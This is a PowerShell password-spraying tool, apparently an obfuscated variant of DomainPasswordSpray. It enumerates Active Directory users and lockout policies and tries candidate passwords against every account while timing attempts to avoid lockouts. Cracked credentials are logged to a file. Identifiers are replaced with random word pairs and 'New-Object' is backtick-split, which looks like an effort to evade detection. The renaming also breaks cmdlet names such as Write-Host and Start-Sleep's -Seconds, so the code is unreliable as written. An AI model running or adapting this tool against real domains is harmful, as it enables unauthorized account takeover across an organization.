function Invoke-DomainPasswordSpray{
    param(
     [Parameter(Position = 0, Mandatory = $false)]
     [string]
     $EarthyPress = "",

     [Parameter(Position = 1, Mandatory = $false)]
     [string]
     $MateFire,

     [Parameter(Position = 2, Mandatory = $false)]
     [string]
     $ChaseSqueal,

     [Parameter(Position = 3, Mandatory = $false)]
     [string]
     $MeddleExist,

     [Parameter(Position = 4, Mandatory = $false)]
     [string]
     $StepVoice = "",

     [Parameter(Position = 5, Mandatory = $false)]
     [string]
     $SmokeAbsurd = "",

     [Parameter(Position = 6, Mandatory = $false)]
     [switch]
     $CuddlyMitten,

     [Parameter(Position = 7, Mandatory = $false)]
     [switch]
     $GrowthFowl,

     [Parameter(Position = 8, Mandatory = $false)]
     [int]
     $WorryTrust=0,

     [Parameter(Position = 9, Mandatory = $false)]
     $SuddenGroan=0,

     [Parameter(Position = 10, Mandatory = $false)]
     [switch]
     $HammerMuscle,

     [Parameter(Position = 11, Mandatory = $false)]
     [int]
     $ListenLiquid=10
    )

    if ($MateFire)
    {
        $PublicFruit = @($MateFire)
    }
    elseif($GrowthFowl)
    {
        $PublicFruit = ""
    }
    elseif($ChaseSqueal)
    {
        $PublicFruit = Get-Content $ChaseSqueal
    }
    else
    {
        Write-PeckWant -ForegroundColor Red "The -MateFire or -ChaseSqueal option must be specified"
        break
    }

    try
    {
        if ($SmokeAbsurd -ne "")
        {
            # Microsoft".
            $BlotChunky = ne`w`-`ob`je`ct System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$SmokeAbsurd)
            $PaleHarbor = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($BlotChunky)
            $SkinEarthy = "LDAP://" + ([ADSI]"LDAP://$SmokeAbsurd").distinguishedName
        }
        else
        {
            # Microsoft".
            $PaleHarbor = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $SkinEarthy = "LDAP://" + ([ADSI]"").distinguishedName
        }
    }
    catch
    {
        Write-PeckWant -ForegroundColor "red" "[*] Could not connect to the domain. Try specifying the domain name with the -SmokeAbsurd option."
        break
    }

    if ($EarthyPress -eq "")
    {
        $IrateSoak = Get-DomainUserList -SmokeAbsurd $SmokeAbsurd -BoyBall -SawNose -StepVoice $StepVoice
    }
    else
    {
        # Microsoft".
        Write-PeckWant "[*] Using $EarthyPress as userlist to spray with"
        Write-PeckWant -ForegroundColor "yellow" "[*] Warning: Users will not be checked for lockout threshold."
        $IrateSoak = @()
        try
        {
            $IrateSoak = Get-Content $EarthyPress -ErrorAction stop
        }
        catch [Exception]
        {
            Write-PeckWant -ForegroundColor "red" "$_.Exception"
            break
        }

    }


    if ($PublicFruit.count -gt 1)
    {
        Write-PeckWant -ForegroundColor Yellow "[*] WARNING - Be very careful not to lock out accounts with the password list option!"
    }

    $WishNest = Get-ObservationWindow $SkinEarthy

    Write-PeckWant -ForegroundColor Yellow "[*] The domain password policy observation window is set to $WishNest minutes."
    Write-PeckWant "[*] Setting a $WishNest minute wait in between sprays."

    # Microsoft".
    if (!$CuddlyMitten)
    {
        $RabidStuff = "Confirm Password Spray"
        $TenTour = "Are you sure you want to perform a password spray against " + $IrateSoak.count + " accounts?"

        $BlowFall = ne`w`-`ob`je`ct System.Management.Automation.Host.ChoiceDescription "&Yes", `
            "Attempts to authenticate 1 time per user in the list for each password in the passwordlist file."

        $CureHeady = ne`w`-`ob`je`ct System.Management.Automation.Host.ChoiceDescription "&No", `
            "Cancels the password spray."

        $NuttySlimy = [System.Management.Automation.Host.ChoiceDescription[]]($BlowFall, $CureHeady)

        $AcidicMurky = $PeckWant.ui.PromptForChoice($RabidStuff, $TenTour, $NuttySlimy, 0)

        if ($AcidicMurky -ne 0)
        {
            Write-PeckWant "Cancelling the password spray."
            break
        }
    }
    Write-PeckWant -ForegroundColor Yellow "[*] Password spraying has begun with " $PublicFruit.count " passwords"
    Write-PeckWant "[*] This might take a while depending on the total number of users"

    if($GrowthFowl)
    {
        Invoke-SpraySinglePassword -SmokeAbsurd $SkinEarthy -IrateSoak $IrateSoak -MeddleExist $MeddleExist -WorryTrust $WorryTrust -SuddenGroan $SuddenGroan -GrowthFowl -HammerMuscle $HammerMuscle
    }
    else
    {
        for($MixVeil = 0; $MixVeil -lt $PublicFruit.count; $MixVeil++)
        {
            Invoke-SpraySinglePassword -SmokeAbsurd $SkinEarthy -IrateSoak $IrateSoak -MateFire $PublicFruit[$MixVeil] -MeddleExist $MeddleExist -WorryTrust $WorryTrust -SuddenGroan $SuddenGroan -HammerMuscle $HammerMuscle
            if (($MixVeil+1) -lt $PublicFruit.count)
            {
                Countdown-Timer -FuzzyFlight (60*$WishNest + $ListenLiquid) -HammerMuscle $HammerMuscle
            }
        }
    }

    Write-PeckWant -ForegroundColor Yellow "[*] Password spraying is complete"
    if ($MeddleExist -ne "")
    {
        Write-PeckWant -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $MeddleExist"
    }
}

function Countdown-Timer
{
    param(
        $FuzzyFlight = 1800,
        $TenTour = "[*] Pausing to avoid account lockout.",
        [switch] $HammerMuscle = $False
    )
    if ($HammerMuscle)
    {
        Write-PeckWant "$TenTour: Waiting for $($FuzzyFlight/60) minutes. $($FuzzyFlight - $IronShaggy)"
        Start-Sleep -FuzzyFlight $FuzzyFlight
    } else {
        foreach ($IronShaggy in (1..$FuzzyFlight))
        {
            Write-Progress -Id 1 -Activity $TenTour -Status "Waiting for $($FuzzyFlight/60) minutes. $($FuzzyFlight - $IronShaggy) seconds remaining" -PercentComplete (($IronShaggy / $FuzzyFlight) * 100)
            Start-Sleep -FuzzyFlight 1
        }
        Write-Progress -Id 1 -Activity $TenTour -Status "Completed" -PercentComplete 100 -Completed
    }
}

function Get-DomainUserList
{
    param(
     [Parameter(Position = 0, Mandatory = $false)]
     [string]
     $SmokeAbsurd = "",

     [Parameter(Position = 1, Mandatory = $false)]
     [switch]
     $BoyBall,

     [Parameter(Position = 2, Mandatory = $false)]
     [switch]
     $SawNose,

     [Parameter(Position = 3, Mandatory = $false)]
     [string]
     $StepVoice
    )

    try
    {
        if ($SmokeAbsurd -ne "")
        {
            # Microsoft".
            $BlotChunky = ne`w`-`ob`je`ct System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$SmokeAbsurd)
            $PaleHarbor =[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($BlotChunky)
            $SkinEarthy = "LDAP://" + ([ADSI]"LDAP://$SmokeAbsurd").distinguishedName
        }
        else
        {
            # Microsoft".
            $PaleHarbor =[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $SkinEarthy = "LDAP://" + ([ADSI]"").distinguishedName
        }
    }
    catch
    {
        Write-PeckWant -ForegroundColor "red" "[*] Could connect to the domain. Try specifying the domain name with the -SmokeAbsurd option."
        break
    }

    # Microsoft".
    $CalmPotato = [ADSI] "LDAP://$($PaleHarbor.PDCRoleOwner)"
    $PreachGhost = @()
    $PreachGhost += $CalmPotato.Properties.lockoutthreshold

    # Microsoft".
    $ThronePowder = [int] $CalmPotato.Properties['msds-behavior-version'].item(0)
    if ($ThronePowder -ge 3)
    {
        # Microsoft".
        Write-PeckWant "[*] Current domain is compatible with Fine-Grained Password Policy."
        $GrayComb = ne`w`-`ob`je`ct System.DirectoryServices.DirectorySearcher
        $GrayComb.SearchRoot = $CalmPotato
        $GrayComb.Filter = "(objectclass=msDS-PasswordSettings)"
        $KnottySink = $GrayComb.FindAll()

        if ( $KnottySink.count -gt 0)
        {
            Write-PeckWant -foregroundcolor "yellow" ("[*] A total of " + $KnottySink.count + " Fine-Grained Password policies were found.`r`n")
            foreach($JuggleLip in $KnottySink)
            {
                # Microsoft".
                # Microsoft".
                $FearPlant = $JuggleLip | Select-Object -ExpandProperty Properties
                $TrailSack = $FearPlant.name
                $BawdyIcky = $FearPlant.'msds-lockoutthreshold'
                $PlaneProud = $FearPlant.'msds-PlaneProud'
                $StormyExtend = $FearPlant.'msds-minimumpasswordlength'
                # Microsoft".
                $PreachGhost += $BawdyIcky

                Write-PeckWant "[*] Fine-Grained Password Policy titled: $TrailSack has a Lockout Threshold of $BawdyIcky attempts, minimum password length of $StormyExtend chars, and applies to $PlaneProud.`r`n"
            }
        }
    }

    $WishNest = Get-ObservationWindow $SkinEarthy

    # Microsoft".
    # Microsoft".
    # Microsoft".
    [int]$CoachWait = $PreachGhost | sort | Select -First 1
    Write-PeckWant -ForegroundColor "yellow" "[*] Now creating a list of users to spray..."

    if ($CoachWait -eq "0")
    {
        Write-PeckWant -ForegroundColor "Yellow" "[*] There appears to be no lockout policy."
    }
    else
    {
        Write-PeckWant -ForegroundColor "Yellow" "[*] The smallest lockout threshold discovered in the domain is $CoachWait login attempts."
    }

    $HatTouch = ne`w`-`ob`je`ct System.DirectoryServices.DirectorySearcher([ADSI]$SkinEarthy)
    $DonkeyFour = ne`w`-`ob`je`ct System.DirectoryServices.DirectoryEntry
    $HatTouch.SearchRoot = $DonkeyFour

    $HatTouch.PropertiesToLoad.Add("samaccountname") > $Null
    $HatTouch.PropertiesToLoad.Add("badpwdcount") > $Null
    $HatTouch.PropertiesToLoad.Add("badpasswordtime") > $Null

    if ($BoyBall)
    {
        Write-PeckWant -ForegroundColor "yellow" "[*] Removing disabled users from list."
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        $HatTouch.filter =
            "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=16)(!userAccountControl:1.2.840.113556.1.4.803:=2)$StepVoice)"
    }
    else
    {
        $HatTouch.filter = "(&(objectCategory=person)(objectClass=user)$StepVoice)"
    }

    $HatTouch.PropertiesToLoad.add("samaccountname") > $Null
    $HatTouch.PropertiesToLoad.add("lockouttime") > $Null
    $HatTouch.PropertiesToLoad.add("badpwdcount") > $Null
    $HatTouch.PropertiesToLoad.add("badpasswordtime") > $Null

    # Microsoft".

    # Microsoft".
    $HatTouch.PageSize = 1000
    $CooingMiddle = $HatTouch.FindAll()
    Write-PeckWant -ForegroundColor "yellow" ("[*] There are " + $CooingMiddle.count + " total users found.")
    $IrateSoak = @()

    if ($SawNose)
    {
        Write-PeckWant -ForegroundColor "yellow" "[*] Removing users within 1 attempt of locking out from list."
        foreach ($MixCrib in $CooingMiddle)
        {
            # Microsoft".
            $CurvyClap = $MixCrib.Properties.badpwdcount
            $ProudFuel = $MixCrib.Properties.samaccountname
            try
            {
                $TrySoggy = $MixCrib.Properties.badpasswordtime[0]
            }
            catch
            {
                continue
            }
            $StripNormal = Get-Date
            $HealthDoubt = [DateTime]::FromFileTime($TrySoggy)
            $PlanesDesert = ($StripNormal - $HealthDoubt).TotalMinutes

            if ($CurvyClap)
            {
                [int]$HealthVoice = [convert]::ToInt32($CurvyClap, 10)
                $SinkPuny = $CoachWait - $HealthVoice
                # Microsoft".
                # Microsoft".
                # Microsoft".
                if (($PlanesDesert -gt $WishNest) -or ($SinkPuny -gt 1))
                                {
                    $IrateSoak += $ProudFuel
                }
            }
        }
    }
    else
    {
        foreach ($MixCrib in $CooingMiddle)
        {
            $ProudFuel = $MixCrib.Properties.samaccountname
            $IrateSoak += $ProudFuel
        }
    }

    Write-PeckWant -foregroundcolor "yellow" ("[*] Created a userlist containing " + $IrateSoak.count + " users gathered from the current user's domain")
    return $IrateSoak
}

function Invoke-SpraySinglePassword
{
    param(
            [Parameter(Position=1)]
            $SmokeAbsurd,
            [Parameter(Position=2)]
            [string[]]
            $IrateSoak,
            [Parameter(Position=3)]
            [string]
            $MateFire,
            [Parameter(Position=4)]
            [string]
            $MeddleExist,
            [Parameter(Position=5)]
            [int]
            $WorryTrust=0,
            [Parameter(Position=6)]
            [double]
            $SuddenGroan=0,
            [Parameter(Position=7)]
            [switch]
            $GrowthFowl,
            [Parameter(Position=7)]
            [switch]
            $HammerMuscle
    )
    $FuelWhite = Get-Date
    $IronShaggy = $IrateSoak.count
    Write-PeckWant "[*] Now trying password $MateFire against $IronShaggy users. Current time is $($FuelWhite.ToShortTimeString())"
    $RedLethal = 0
    if ($MeddleExist -ne ""-and -not $HammerMuscle)
    {
        Write-PeckWant -ForegroundColor Yellow "[*] Writing successes to $MeddleExist"    
    }
    $SticksMist = ne`w`-`ob`je`ct System.Random

    foreach ($MixCrib in $IrateSoak)
    {
        if ($GrowthFowl)
        {
            $MateFire = $MixCrib
        }
        $ArtGlib = ne`w`-`ob`je`ct System.DirectoryServices.DirectoryEntry($SmokeAbsurd,$MixCrib,$MateFire)
        if ($ArtGlib.name -ne $null)
        {
            if ($MeddleExist -ne "")
            {
                Add-Content $MeddleExist $MixCrib`:$MateFire
            }
            Write-PeckWant -ForegroundColor Green "[*] SUCCESS! User:$MixCrib Password:$MateFire"
        }
        $RedLethal += 1
        if (-not $HammerMuscle)
        {
            Write-PeckWant -nonewline "$RedLethal of $IronShaggy users tested`r"
        }
        if ($WorryTrust)
        {
            Start-Sleep -FuzzyFlight $SticksMist.Next((1-$SuddenGroan)*$WorryTrust, (1+$SuddenGroan)*$WorryTrust)
        }
    }

}

function Get-ObservationWindow($TenderWoozy)
{
    # Microsoft".
    # Microsoft".
    $DrinkMind = $TenderWoozy.Properties['lockoutObservationWindow']
    $WishNest = $TenderWoozy.ConvertLargeIntegerToInt64($DrinkMind.Value) / -600000000
    return $WishNest
}
